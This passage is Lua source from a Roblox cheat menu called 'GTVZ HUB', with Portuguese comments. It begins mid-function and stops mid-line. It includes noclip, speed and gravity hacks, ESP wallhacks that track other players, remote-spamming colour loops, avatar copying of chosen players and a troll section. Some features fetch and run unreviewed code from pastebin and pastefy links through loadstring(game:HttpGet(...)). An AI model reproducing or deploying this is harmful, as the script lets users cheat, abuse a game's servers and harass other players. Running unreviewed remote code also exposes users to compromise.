                elseif obj:IsA("Accessory") or obj:IsA("Hat") or obj:IsA("Clothing") then
                    obj:Destroy()
                elseif obj:IsA("MeshPart") then
                    obj.Material = Enum.Material.SmoothPlastic
                    obj.Reflectance = 0
                    obj.CastShadow = false
                elseif obj:IsA("BasePart") then
                    obj.Material = Enum.Material.SmoothPlastic
                    obj.CastShadow = false
                    obj.Reflectance = 0
                elseif obj:IsA("Model") and obj:FindFirstChild("Handle") then
                    obj:Destroy()
                end
            end
            
            -- Limpa o workspace
            for _, obj in ipairs(Workspace:GetDescendants()) do
                limparObjeto(obj)
            end
            
            -- Remove animações dos jogadores
            for _, plr in pairs(Players:GetPlayers()) do
                if plr.Character then
                    local animator = plr.Character:FindFirstChildOfClass("Animator")
                    if animator then
                        for _, animTrack in pairs(animator:GetPlayingAnimationTracks()) do
                            animTrack:Stop()
                        end
                    end
                    for _, child in pairs(plr.Character:GetChildren()) do
                        if child:IsA("Accessory") or child:IsA("Clothing") or child:IsA("Shirt") or child:IsA("Pants") then
                            child:Destroy()
                        end
                    end
                end
            end
            
            -- Monitora novos objetos
            Workspace.DescendantAdded:Connect(function(obj)
                task.wait()
                limparObjeto(obj)
            end)
            
            Lighting.DescendantAdded:Connect(function(obj)
                if obj:IsA("PostEffect") or obj:IsA("BloomEffect") or obj:IsA("BlurEffect") or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("DepthOfFieldEffect") or obj:IsA("Atmosphere") then
                    pcall(function()
                        obj.Enabled = false
                        task.wait(0.1)
                        obj:Destroy()
                    end)
                end
            end)
            
            -- Remove água
            for _, v in pairs(Workspace:GetChildren()) do
                if v:IsA("Terrain") then
                    v.WaterWaveSize = 0
                    v.WaterWaveSpeed = 0
                    v.WaterReflectance = 0
                    v.WaterTransparency = 1
                end
            end
        end
    end,
})

Tabconfg:AddToggle({
    Name = "GRAFICO LITE COM SKIN",
    Callback = function(state)
        if state then
            local Lighting = game:GetService("Lighting")
            local Workspace = game:GetService("Workspace")
            local Players = game:GetService("Players")
            
            settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
            
            Lighting.GlobalShadows = false
            Lighting.FogEnd = 9e9
            Lighting.Brightness = 1
            Lighting.EnvironmentDiffuseScale = 0
            Lighting.EnvironmentSpecularScale = 0
            Lighting.Technology = Enum.Technology.Legacy

            -- Remove todos os efeitos de pós-processamento
            for _, v in ipairs(Lighting:GetDescendants()) do
                if v:IsA("PostEffect") or v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("SunRaysEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("Atmosphere") or v:IsA("Sky") then
                    pcall(function()
                        v.Enabled = false
                        if v:IsA("Sky") then v:Destroy() end
                    end)
                end
            end
            
            -- Função para limpar objetos (sem remover skins dos jogadores)
            local function limparObjeto(obj)
                if not obj then return end
                
                -- Remove efeitos visuais
                if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Explosion") or obj:IsA("Sparkles") then
                    obj:Destroy()
                elseif obj:IsA("Decal") or obj:IsA("Texture") or obj:IsA("BillboardGui") then
                    obj:Destroy()
                elseif obj:IsA("MeshPart") then
                    obj.Material = Enum.Material.SmoothPlastic
                    obj.Reflectance = 0
                    obj.CastShadow = false
                elseif obj:IsA("BasePart") then
                    obj.Material = Enum.Material.SmoothPlastic
                    obj.CastShadow = false
                    obj.Reflectance = 0
                elseif obj:IsA("Model") and obj:FindFirstChild("Handle") then
                    obj:Destroy()
                end
            end
            
            -- Limpa o workspace (mas não remove skins)
            for _, obj in ipairs(Workspace:GetDescendants()) do
                -- VERIFICA SE NÃO É PARTE DO JOGADOR
                local isPlayerPart = false
                for _, plr in pairs(Players:GetPlayers()) do
                    if plr.Character and obj:IsDescendantOf(plr.Character) then
                        isPlayerPart = true
                        break
                    end
                end
                
                if not isPlayerPart then
                    limparObjeto(obj)
                end
            end
            
            -- Remove animações dos jogadores (só para, não remove roupas)
            for _, plr in pairs(Players:GetPlayers()) do
                if plr.Character then
                    local animator = plr.Character:FindFirstChildOfClass("Animator")
                    if animator then
                        for _, animTrack in pairs(animator:GetPlayingAnimationTracks()) do
                            animTrack:Stop()
                        end
                    end
                    -- NÃO remove acessórios, roupas, etc.
                end
            end
            
            -- Monitora novos objetos (pulando partes dos jogadores)
            Workspace.DescendantAdded:Connect(function(obj)
                task.wait()
                
                -- Verifica se o objeto pertence a algum jogador
                local isPlayerObject = false
                for _, plr in pairs(Players:GetPlayers()) do
                    if plr.Character and obj:IsDescendantOf(plr.Character) then
                        isPlayerObject = true
                        break
                    end
                end
                
                if not isPlayerObject then
                    limparObjeto(obj)
                end
            end)
            
            Lighting.DescendantAdded:Connect(function(obj)
                if obj:IsA("PostEffect") or obj:IsA("BloomEffect") or obj:IsA("BlurEffect") or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("DepthOfFieldEffect") or obj:IsA("Atmosphere") then
                    pcall(function()
                        obj.Enabled = false
                        task.wait(0.1)
                        obj:Destroy()
                    end)
                end
            end)
            
            -- Remove água
            for _, v in pairs(Workspace:GetChildren()) do
                if v:IsA("Terrain") then
                    v.WaterWaveSize = 0
                    v.WaterWaveSpeed = 0
                    v.WaterReflectance = 0
                    v.WaterTransparency = 1
                end
            end
        end
    end,
})

loadstring(' s = Instance.new("Sky")\n\t\ts.Name = "Sky"\n\t\ts.Parent = game.Lighting\n\t\ts.SkyboxBk = "http://www.roblox.com/asset/?id=103778952050387"\n\t\ts.SkyboxDn = "http://www.roblox.com/asset/?id=103778952050387"\n\t\ts.SkyboxFt = "http://www.roblox.com/asset/?id=103778952050387"\n\t\ts.SkyboxLf = "http://www.roblox.com/asset/?id=103778952050387"\n\t\ts.SkyboxRt = "http://www.roblox.com/asset/?id=103778952050387"\n\t\ts.SkyboxUp = "http://www.roblox.com/asset/?id=103778952050387"\n\t\t\nlocal Players = game:GetService("Players")\nlocal RE = game:GetService("ReplicatedStorage"):WaitForChild("RE")\nlocal remote = RE:FindFirstChild("1RPNam1eColo1r")\n\n-- Lerp entre duas cores\nlocal function lerpColor(c1, c2, t)\n\treturn Color3.new(\n\t\tc1.R + (c2.R - c1.R) * t,\n\t\tc1.G + (c2.G - c1.G) * t,\n\t\tc1.B + (c2.B - c1.B) * t\n\t)\nend\n\n-- Fun\231\227o que aplica o RGB constantemente\nlocal function startRGBLoop()\n\ttask.spawn(function()\n\t\tlocal black = Color3.new(0, 0, 0)\n\t\tlocal green = Color3.fromRGB(0, 255, 0)\n\n\t\twhile true do\n\t\t\t-- Preto \146 Verde\n\t\t\tfor t = 0, 1, 0.02 do\n\t\t\t\tif remote then\n\t\t\t\t\tremote:FireServer("PickingRPBioColor", lerpColor(black, green, t))\n\t\t\t\tend\n\t\t\t\ttask.wait(0.03)\n\t\t\tend\n\t\t\t-- Verde \146 Preto\n\t\t\tfor t = 1, 0, -0.02 do\n\t\t\t\tif remote then\n\t\t\t\t\tremote:FireServer("PickingRPBioColor", lerpColor(black, green, t))\n\t\t\t\tend\n\t\t\t\ttask.wait(0.03)\n\t\t\tend\n\t\tend\n\tend)\nend\n\n-- Inicia o loop uma vez\nstartRGBLoop()\n\n-- Reinicia o loop ao respawnar\nPlayers.LocalPlayer.CharacterAdded:Connect(function()\n\t-- Espera um pouco ap\243s spawn\n\ttask.wait(1)\n\tstartRGBLoop()\nend)\nwait(0.4)\n\nlocal args = {\n\n    [1] = "RolePlayBio",\n    [2] = "CARREGANDO SCRIPT"\n}\n\ngame:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args))\nwait(5)\n\nlocal args = {\n    [1] = "RolePlayBio",\n    [2] = "USE : GTVZ HUB"\n}\n\ngame:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args))\nwait(2.0)\nlocal Libary = loadstring(game:HttpGet("https://pastefy.app/SibplqH8/raw"))()\n\nworkspace.FallenPartsDestroyHeight = -math.huge\n\nlocal Window = Libary:MakeWindow({\n    Title = "GTVZ HUB",\n    SubTitle = "YT : GT_MINGUI",\n    LoadText = "GTVZ HUB",\n    Flags = "GTVZ HUB"\n})\n\nWindow:AddMinimizeButton({\n    Button = { Image = "rbxassetid://17628296195", BackgroundTransparency = 0 },\n    Corner = { CornerRadius = UDim.new(35, 1) },\n})\n\nlocal Tabstatus = Window:MakeTab({ Title = "STATUS", Icon = "rbxassetid://10723415903" })\nlocal InfoTab = Window:MakeTab({ Title = "INFO", Icon = "rbxassetid://10709790387" })\nlocal Tabjogado = Window:MakeTab({"JOGADOR", "user"})\nlocal Tabprici = Window:MakeTab({ "AVATA", "rbxassetid://10734952036" })\nlocal Troll = Window:MakeTab({ Title = "TROLL", Icon = "rbxassetid://131153193945220" })\nlocal protec = Window:MakeTab({ Title = "ANTI", Icon = "rbxassetid://11322093465" })\nlocal Tabcasa = Window:MakeTab({"CASA", "home"})\nlocal Tab = Window:MakeTab({"TELEPORT", "tp"})\nlocal Tabmusic = Window:MakeTab({"TROLL AUDIO", "music"})\nlocal CarTab = Window:MakeTab({"VE\205CULO", "car"})\nlocal Tabconfg = Window:MakeTab({ Title = "CONFIG", Icon = "settings" })\n----------------------------------------------------------------\n\nTabstatus:AddSection({ Name = "STATUS" })\n\nlocal startTime = tick()\n\nlocal playTimeParagraph = Tabstatus:AddParagraph({"TEMPO JOGANDO", "0s"})\n\ntask.spawn(function()\n    while true do\n        task.wait(1)\n        local elapsed = math.floor(tick() - startTime)\n        local minutes = math.floor(elapsed / 60)\n        local seconds = elapsed % 60\n        local displayText = string.format("%02dmin %02ds", minutes, seconds)\n        playTimeParagraph:SetDesc(displayText)\n    end\nend)\n\nlocal gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name\n\nTabstatus:AddParagraph({"JOGO", gameName})\n\nTabstatus:AddParagraph({"M\193XIMO NO SERVIDOR", tostring(game.Players.MaxPlayers)})\n\nlocal currentPlayersParagraph = Tabstatus:AddParagraph({"JOGADORES", tostring(#game.Players:GetPlayers())})\n\n-- Atualiza quantidade de jogadores em tempo real\ntask.spawn(function()\n    while true do\n        task.wait(1)\n        local playerCount = #game.Players:GetPlayers()\n        currentPlayersParagraph:SetDesc(tostring(playerCount))\n    end\nend)\n\nlocal UserInputService = game:GetService("UserInputService")\n\nlocal function getDeviceType()\n    local platform = UserInputService:GetPlatform()\n\n    if platform == Enum.Platform.Windows then\n        return "DISPOSITIVO : WINDOWS"\n    elseif platform == Enum.Platform.OSX then\n        return "DISPOSITIVO : MACBOOK"\n    elseif platform == Enum.Platform.XBoxOne then\n        return "DISPOSITIVO : XBOX"\n    elseif platform == Enum.Platform.IOS or platform == Enum.Platform.Android then\n        if UserInputService.KeyboardEnabled or UserInputService.MouseEnabled then\n            return "DISPOSITIVO : TABLET"\n        else\n            return "DISPOSITIVO : CELULAR"\n        end\n    else\n        return "DISPOSITIVO : DESCONHECIDO"\n    end\nend\n\nTabstatus:AddParagraph({"DISPOSITIVO", getDeviceType()})\n\nlocal executor = identifyexecutor and identifyexecutor() or "Executor Desconhecido"\nwarn("Executor detectado: " .. executor)\n\nTabstatus:AddParagraph({"EXECUTOR", executor})\n\nTabstatus:AddSection({ Name = "CONFIG" })\n\nTabstatus:AddButton({\n    Name = "RECONECTAR",\n    Callback = function()\n        local TeleportService = game:GetService("TeleportService")\n\nTeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId)\n    end,\n})\n\nTabstatus:AddButton({\n    Name = "IR PRA SERVER CHEIO",\n    Callback = function()\n        local Http = game:GetService("HttpService")\nlocal TPS = game:GetService("TeleportService")\nlocal Players = game:GetService("Players")\n\nlocal PlaceId = game.PlaceId\nlocal Api = "https://games.roblox.com/v1/games/"..PlaceId.."/servers/Public?sortOrder=Desc&limit=100"\n\nlocal function FindServer()\n    local cursor = nil\n    repeat\n        local url = Api .. (cursor and "&cursor="..cursor or "")\n        local data = Http:JSONDecode(game:HttpGet(url))\n        for _, server in pairs(data.data) do\n            if server.playing < server.maxPlayers and server.playing >= 21 then\n                return server.id\n            end\n        end\n        cursor = data.nextPageCursor\n    until not cursor\nend\n\nlocal serverId = FindServer()\nif serverId then\n    TPS:TeleportToPlaceInstance(PlaceId, serverId, Players.LocalPlayer)\nelse\n    warn("AGUARDE ACHAR SERVIDOR CHEIO.")\nend\n    end,\n})\n\nTabstatus:AddButton({\n    Name = "MUDA DE SERVER",\n    Callback = function()\n        local Http = game:GetService("HttpService")\nlocal TPS = game:GetService("TeleportService")\nlocal Api = "https://games.roblox.com/v1/games/"\n\nlocal _place = game.PlaceId\nlocal _servers = Api.._place.."/servers/Public?sortOrder=Asc&limit=100"\nfunction ListServers(cursor)\n  local Raw = game:HttpGet(_servers .. ((cursor and "&cursor="..cursor) or ""))\n  return Http:JSONDecode(Raw)\nend\n\nlocal Server, Next; repeat\n  local Servers = ListServers(Next)\n  Server = Servers.data[1]\n  Next = Servers.nextPageCursor\nuntil Server\n\nTPS:TeleportToPlaceInstance(_place,Server.id,game.Players.LocalPlayer)\n    end,\n})\n----------------------------------------------------------------\n\nInfoTab:AddDiscordInvite({\n    Name = "GTVZ HUB",\n    Description = "DISCORD GTVZ HUB",\n    Logo = "rbxassetid://17628296195",\n    Invite = "https://discord.gg/SXtfYJSPny",\n})\n\nInfoTab:AddParagraph({"DESENVOLVENDO : GTVZ MODDED", })\n\nInfoTab:AddParagraph({"EQUIPE : GTXMIX",})\n----------------------------------------------------------------\n\nlocal Section = Tabjogado:AddSection({\n    Name = "JOGADOR"\n})\n\nTabjogado:AddButton({\n    Name = "FLY JOGADO",\n    Callback = function()\n        loadstring(game:HttpGet("https://pastebin.com/raw/QjjQvMsE"))()\n    end\n})\n\n\nlocal RunService = game:GetService("RunService")\nlocal player = game.Players.LocalPlayer\nlocal connection = nil\nlocal running = false\n\n-- Vari\225veis para armazenar os valores atuais\nlocal currentWalkSpeed = 16\nlocal currentJumpPower = 50\nlocal currentGravity = 196.2\n\n-- Fun\231\227o para aplicar noclip\nlocal function ativarNoclip()\n    if running then return end\n    running = true\n    connection = RunService.Stepped:Connect(function()\n        if not running or not player.Character then return end\n        for _, v in pairs(player.Character:GetDescendants()) do\n            if v:IsA("BasePart") then\n                v.CanCollide = false\n            end\n        end\n    end)\nend\n\n-- Fun\231\227o para desativar noclip\nlocal function desativarNoclip()\n    running = false\n    if connection then\n        connection:Disconnect()\n        connection = nil\n    end\nend\n\n-- Fun\231\227o para obter o Humanoid com seguran\231a\nlocal function getHumanoid()\n    if player.Character and player.Character:FindFirstChild("Humanoid") then\n        return player.Character.Humanoid\n    end\n    return nil\nend\n\n-- Fun\231\227o para restaurar todos os valores no novo personagem\nlocal function onCharacterAdded(character)\n    -- Aguarda o Humanoid carregar\n    local humanoid = character:WaitForChild("Humanoid", 5)\n    if humanoid then\n        humanoid.WalkSpeed = currentWalkSpeed\n        humanoid.UseJumpPower = true\n        humanoid.JumpPower = currentJumpPower\n    end\nend\n\n-- Reconecta quando o personagem respawna\nplayer.CharacterAdded:Connect(onCharacterAdded)\n\n-- Aplica valores iniciais se o personagem j\225 existir\nif player.Character then\n    onCharacterAdded(player.Character)\nend\n\n-- Toggle do Noclip\nTabjogado:AddToggle({\n    Name = "ATRAVESSAR PAREDE",\n    Callback = function(value)\n        if value then\n            ativarNoclip()\n        else\n            desativarNoclip()\n        end\n    end\n})\n\n-- Velocidade do jogador\nTabjogado:AddTextBox({\n    Name = "VELOCIDADE JOGADOR",\n    PlaceholderText = "DIGITE A VELOCIDADE",\n    Callback = function(value)\n        local speed = tonumber(value)\n        if speed then\n            currentWalkSpeed = speed\n            local humanoid = getHumanoid()\n            if humanoid then\n                humanoid.WalkSpeed = speed\n            end\n        else\n            warn("Velocidade inv\225lida!")\n        end\n    end\n})\n\n-- Resetar velocidade\nTabjogado:AddButton({\n    Name = "RESETAR VELOCIDADE",\n    Callback = function()\n        currentWalkSpeed = 16\n        local humanoid = getHumanoid()\n        if humanoid then\n            humanoid.WalkSpeed = 16\n        end\n    end\n})\n\n-- Altura do pulo\nTabjogado:AddTextBox({\n    Name = "ALTURA DO PULO",\n    PlaceholderText = "DIGITE ALTURA PULO",\n    Callback = function(value)\n        local jumpPower = tonumber(value)\n        if jumpPower then\n            currentJumpPower = jumpPower\n            local humanoid = getHumanoid()\n            if humanoid then\n                humanoid.UseJumpPower = true\n                humanoid.JumpPower = jumpPower\n            end\n        else\n            warn("Altura de pulo inv\225lida!")\n        end\n    end\n})\n\n-- Resetar pulo\nTabjogado:AddButton({\n    Name = "RESETAR PULO",\n    Callback = function()\n        currentJumpPower = 50\n        local humanoid = getHumanoid()\n        if humanoid then\n            humanoid.UseJumpPower = true\n            humanoid.JumpPower = 50\n        end\n    end\n})\n\n-- Gravidade\nTabjogado:AddTextBox({\n    Name = "GRAVIDADE",\n    PlaceholderText = "DIGITE GRAVIDADE",\n    Callback = function(value)\n        local gravity = tonumber(value)\n        if gravity then\n            currentGravity = gravity\n            workspace.Gravity = gravity\n        else\n            warn("Gravidade inv\225lida!")\n        end\n    end\n})\n\n-- Resetar gravidade\nTabjogado:AddButton({\n    Name = "RESETAR GRAVIDADE",\n    Callback = function()\n        currentGravity = 196.2\n        workspace.Gravity = 196.2\n    end\n})\n\nTabjogado:AddSection({ Name = "ESP JOGADOR" })\n\n\nlocal Players = game:GetService("Players")\nlocal RunService = game:GetService("RunService")\nlocal LocalPlayer = Players.LocalPlayer\n\nlocal espRunning = false\nlocal espConnection\n\nlocal function updatePlayerESP()\n    local localCharacter = LocalPlayer.Character\n    if not localCharacter or not localCharacter:FindFirstChild("Head") then return end\n\n    for _, player in ipairs(Players:GetPlayers()) do\n        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Head") then\n            local head = player.Character.Head\n            local distance = (localCharacter.Head.Position - head.Position).Magnitude\n\n            local billboardGui = head:FindFirstChild("TadachiisESPTags")\n            if not billboardGui then\n                billboardGui = Instance.new("BillboardGui")\n                billboardGui.Name = "TadachiisESPTags"\n                billboardGui.Adornee = head\n                billboardGui.Size = UDim2.new(0, 100, 0, 50)\n                billboardGui.StudsOffset = Vector3.new(0, 2, 0)\n                billboardGui.AlwaysOnTop = true\n                billboardGui.LightInfluence = 1\n                billboardGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling\n                billboardGui.Parent = head\n\n                local textLabel = Instance.new("TextLabel")\n                textLabel.Name = "NameLabel"\n                textLabel.Size = UDim2.new(1, 0, 1, 0)\n                textLabel.BackgroundTransparency = 1\n                textLabel.TextColor3 = Color3.fromRGB(0, 255, 0)\n                textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)\n                textLabel.TextStrokeTransparency = 0\n                textLabel.TextScaled = true\n                textLabel.Text = player.Name .. "\\nDistance: " .. math.floor(distance)\n                textLabel.Parent = billboardGui\n            else\n                local label = billboardGui:FindFirstChild("NameLabel")\n                if label then\n                    label.Text = player.Name .. "\\nDistance: " .. math.floor(distance)\n                end\n            end\n        end\n    end\nend\n\nlocal function enableESP()\n    if not espRunning then\n        espConnection = RunService.Heartbeat:Connect(updatePlayerESP)\n        espRunning = true\n        print("ESP ativado.")\n    end\nend\n\nlocal function disableESP()\n    if espConnection then\n        espConnection:Disconnect()\n        espConnection = nil\n    end\n    espRunning = false\n\n    for _, player in ipairs(Players:GetPlayers()) do\n        if player.Character and player.Character:FindFirstChild("Head") then\n            local tag = player.Character.Head:FindFirstChild("TadachiisESPTags")\n            if tag then\n                tag:Destroy()\n            end\n        end\n    end\n\n    print("ESP desativado.")\nend\n\n-- Toggle no Tabjogado\nTabjogado:AddToggle({\n    Name = "ESP NOME DISTANCIA",\n    Default = false,\n    Callback = function(state)\n        if state then\n            enableESP()\n        else\n            disableESP()\n        end\n    end\n})\n\n\n\n\n\nlocal FillColor = Color3.fromRGB(0,255,0)\nlocal DepthMode = "AlwaysOnTop"\nlocal FillTransparency = 0.5\nlocal OutlineColor = Color3.fromRGB(0,0,0)\nlocal OutlineTransparency = 0\n\nlocal CoreGui = game:FindService("CoreGui")\nlocal Players = game:FindService("Players")\nlocal lp = Players.LocalPlayer\nlocal connections = {}\nlocal Storage = nil\n\nlocal function EnableESP()\n    if Storage then return end -- j\225 ativado\n\n    Storage = Instance.new("Folder")\n    Storage.Parent = CoreGui\n    Storage.Name = "Highlight_Storage"\n\n    local function Highlight(plr)\n        if plr == lp then return end -- ignora o pr\243prio jogador\n\n        local highlight = Instance.new("Highlight")\n        highlight.Name = plr.Name\n        highlight.FillColor = FillColor\n        highlight.DepthMode = Enum.HighlightDepthMode[DepthMode]\n        highlight.FillTransparency = FillTransparency\n        highlight.OutlineColor = OutlineColor\n        highlight.OutlineTransparency = OutlineTransparency\n        highlight.Parent = Storage\n\n        local plrchar = plr.Character\n        if plrchar then\n            highlight.Adornee = plrchar\n        end\n\n        connections[plr] = plr.CharacterAdded:Connect(function(char)\n            highlight.Adornee = char\n        end)\n    end\n\n    connections["_PlayerAdded"] = Players.PlayerAdded:Connect(Highlight)\n\n    for _, v in pairs(Players:GetPlayers()) do\n        Highlight(v)\n    end\n\n    print("ESP Highlight ativado.")\nend\n\nlocal function DisableESP()\n    if Storage then\n        Storage:Destroy()\n        Storage = nil\n    end\n\n    for _, conn in pairs(connections) do\n        if conn and conn.Disconnect then\n            conn:Disconnect()\n        end\n    end\n    connections = {}\n\n    print("ESP Highlight desativado.")\nend\n\n-- Toggle no Tabjogado\nTabjogado:AddToggle({\n    Name = "ESP HOLOGRAMA",\n    Default = false,\n    Callback = function(state)\n        if state then\n            EnableESP()\n        else\n            DisableESP()\n        end\n    end\n})\n\n-------------------------PRICIPAL---------------------------------------\n\nTabprici:AddSection({ Name = "PRINCIPAL" })\n\nTabprici:AddToggle({\n    Name = "NOME RGB",\n    Default = false,\n    Callback = function(value)\n        if value then\n            startRGBLoop()\n        else\n            stopRGBLoop()\n        end\n    end\n})\n\n-- Servi\231os\nlocal Players = game:GetService("Players")\nlocal RE = game:GetService("ReplicatedStorage"):WaitForChild("RE")\nlocal remote = RE:FindFirstChild("1RPNam1eColo1r")\n\n-- Fun\231\227o para interpolar entre duas cores\nlocal function lerpColor(c1, c2, t)\n\treturn Color3.new(\n\t\tc1.R + (c2.R - c1.R) * t,\n\t\tc1.G + (c2.G - c1.G) * t,\n\t\tc1.B + (c2.B - c1.B) * t\n\t)\nend\n\n-- Paleta RGB + cores gama\nlocal colorList = {\n\tColor3.fromRGB(255, 0, 0),\n\tColor3.fromRGB(255, 102, 0),\n\tColor3.fromRGB(255, 255, 0),\n\tColor3.fromRGB(0, 255, 0),\n\tColor3.fromRGB(0, 255, 255),\n\tColor3.fromRGB(0, 102, 255),\n\tColor3.fromRGB(153, 0, 255),\n\tColor3.fromRGB(255, 0, 255),\n\tColor3.fromRGB(255, 105, 180),\n\tColor3.fromRGB(255, 215, 0),\n\tColor3.fromRGB(0, 255, 127),\n\tColor3.fromRGB(135, 206, 250),\n\tColor3.fromRGB(255, 51, 153),\n\tColor3.fromRGB(102, 255, 178),\n\tColor3.fromRGB(204, 153, 255)\n}\n\n-- Controle do loop RGB\nlocal loopRunning = false\nlocal rgbThread = nil\n\n-- In\237cio da anima\231\227o RGB com transi\231\227o suave\nfunction startRGBLoop()\n\tif loopRunning then return end\n\tloopRunning = true\n\trgbThread = task.spawn(function()\n\t\twhile loopRunning do\n\t\t\tfor i = 1, #colorList do\n\t\t\t\tlocal c1 = colorList[i]\n\t\t\t\tlocal c2 = colorList[i % #colorList + 1]\n\t\t\t\tfor t = 0, 1, 0.02 do\n\t\t\t\t\tif not loopRunning then return end\n\t\t\t\t\tif remote then\n\t\t\t\t\t\tremote:FireServer("PickingRPNameColor", lerpColor(c1, c2, t))\n\t\t\t\t\tend\n\t\t\t\t\ttask.wait(0.02)\n\t\t\t\tend\n\t\t\tend\n\t\tend\n\tend)\nend\n\n-- Parar anima\231\227o RGB\nfunction stopRGBLoop()\n\tloopRunning = false\nend\n\n\nTabprici:AddToggle({\n    Name = "CORPO RGB",\n    Default = false,\n    Callback = function(value)\n        if value then\n            startRGBCharacter()\n        else\n            stopRGBCharacter()\n        end\n    end\n})\n\n-- Lista de cores RGB para o corpo\nlocal bodyColors = {\n    "Bright red",\n    "Lime green",\n    "Bright blue",\n    "Bright yellow",\n    "Bright cyan",\n    "Hot pink",\n    "Royal purple"\n}\n\nlocal bodyLoopRunning = false\nlocal rgbBodyThread = nil\n\nlocal function changeBodyColor(color)\n    local args = { color }\n    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ChangeBodyColor"):FireServer(unpack(args))\nend\n\nfunction startRGBCharacter()\n    if bodyLoopRunning then return end\n    bodyLoopRunning = true\n    rgbBodyThread = task.spawn(function()\n        while bodyLoopRunning do\n            for _, color in ipairs(bodyColors) do\n                if not bodyLoopRunning then return end\n                changeBodyColor(color)\n                task.wait(0.5)\n            end\n        end\n    end)\nend\n\nfunction stopRGBCharacter()\n    bodyLoopRunning = false\nend\n\n\nlocal hairColors = {\n    Color3.new(1, 1, 0), Color3.new(0, 0, 1), Color3.new(1, 0, 1), Color3.new(1, 1, 1),\n    Color3.new(0, 1, 0), Color3.new(0.5, 0, 1), Color3.new(1, 0.647, 0), Color3.new(0, 1, 1)\n}\nlocal isActive = false\n\n\nlocal function changeHairColor()\n    local i = 1\n    while isActive do\n        if not isActive then break end\n        local args = { [1] = "ChangeHairColor2", [2] = hairColors[i] }\n        game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Max1y"):FireServer(unpack(args))\n        wait(0.1)\n        i = i % #hairColors + 1\n    end\nend\n\n\nTabprici:AddToggle({\n    Name = "CABELO RGB",\n    Default = false,\n    Callback = function(value)\n        isActive = value\n        if isActive then\n            changeHairColor()\n        end\n    end\n})\n\n\nlocal Players = game:GetService("Players")\nlocal ReplicatedStorage = game:GetService("ReplicatedStorage")\nlocal Remotes = ReplicatedStorage:WaitForChild("Remotes")\n\nlocal Target = nil\n\nlocal function GetPlayerNames()\n    local PlayerNames = {}\n    for _, player in ipairs(Players:GetPlayers()) do\n        table.insert(PlayerNames, player.Name)\n    end\n    return PlayerNames\nend\n\nlocal Dropdown = Tabprici:AddDropdown({\n    Name = "SELECIONAR JOGADOR",\n    Options = GetPlayerNames(),\n    Default = Target,\n    Callback = function(Value)\n        Target = Value\n    end\n})\n\n-- // Atualizar Dropdown dinamicamente\nlocal function UpdateDropdown()\n    Dropdown:Refresh(GetPlayerNames(), true)\nend\n\nPlayers.PlayerAdded:Connect(UpdateDropdown)\nPlayers.PlayerRemoving:Connect(UpdateDropdown)\n\n-- // Bot\227o: Copiar Avatar\nTabprici:AddButton({\n    Name = "COPIAR AVATAR",\n    Callback = function()\n        if not Target then return end\n\n        local LP = Players.LocalPlayer\n        local LChar = LP.Character\n        local TPlayer = Players:FindFirstChild(Target)\n\n        if not (TPlayer and TPlayer.Character) then return end\n\n        local LHumanoid = LChar and LChar:FindFirstChildOfClass("Humanoid")\n        local THumanoid = TPlayer.Character:FindFirstChildOfClass("Humanoid")\n\n        if not (LHumanoid and THumanoid) then return end\n\n        \n        local LDesc = LHumanoid:GetAppliedDescription()\n\n        for _, acc in ipairs(LDesc:GetAccessories(true)) do\n            if acc.AssetId and tonumber(acc.AssetId) then\n                Remotes.Wear:InvokeServer(tonumber(acc.AssetId))\n                task.wait(0.2)\n            end\n        end\n\n        if tonumber(LDesc.Shirt) then\n            Remotes.Wear:InvokeServer(tonumber(LDesc.Shirt))\n            task.wait(0.2)\n        end\n\n        if tonumber(LDesc.Pants) then\n            Remotes.Wear:InvokeServer(tonumber(LDesc.Pants))\n            task.wait(0.2)\n        end\n\n        if tonumber(LDesc.Face) then\n            Remotes.Wear:InvokeServer(tonumber(LDesc.Face))\n            task.wait(0.2)\n        end\n\n        -- // Copiar do jogador selecionado\n        local PDesc = THumanoid:GetAppliedDescription()\n\n        -- Trocar corpo\n        local argsBody = {\n            [1] = {\n                [1] = PDesc.Torso,\n                [2] = PDesc.RightArm,\n                [3] = PDesc.LeftArm,\n                [4] = PDesc.RightLeg,\n                [5] = PDesc.LeftLeg,\n                [6] = PDesc.Head\n            }\n        }\n        Remotes.ChangeCharacterBody:InvokeServer(unpack(argsBody))\n        task.wait(0.5)\n\n        -- Aplicar roupas e face\n        if tonumber(PDesc.Shirt) then\n            Remotes.Wear:InvokeServer(tonumber(PDesc.Shirt))\n            task.wait(0.3)\n        end\n\n        if tonumber(PDesc.Pants) then\n            Remotes.Wear:InvokeServer(tonumber(PDesc.Pants))\n            task.wait(0.3)\n        end\n\n        if tonumber(PDesc.Face) then\n            Remotes.Wear:InvokeServer(tonumber(PDesc.Face))\n            task.wait(0.3)\n        end\n\n        -- Aplicar acess\243rios\n        for _, acc in ipairs(PDesc:GetAccessories(true)) do\n            if acc.AssetId and tonumber(acc.AssetId) then\n                Remotes.Wear:InvokeServer(tonumber(acc.AssetId))\n                task.wait(0.3)\n            end\n        end\n\n        -- Copiar cor de pele\n        local SkinColor = TPlayer.Character:FindFirstChild("Body Colors")\n        if SkinColor then\n            Remotes.ChangeBodyColor:FireServer(tostring(SkinColor.HeadColor))\n            task.wait(0.3)\n        end\n\n        -- Copiar anima\231\227o (Idle)\n        if tonumber(PDesc.IdleAnimation) then\n            Remotes.Wear:InvokeServer(tonumber(PDesc.IdleAnimation))\n            task.wait(0.3)\n        end\n    end\n})\n\n\n\n\n\n-----------------------=\128TROLL=\128---------------------------------------\n\nlocal Players = game:GetService("Players")\nlocal LocalPlayer = Players.LocalPlayer\nlocal ReplicatedStorage = 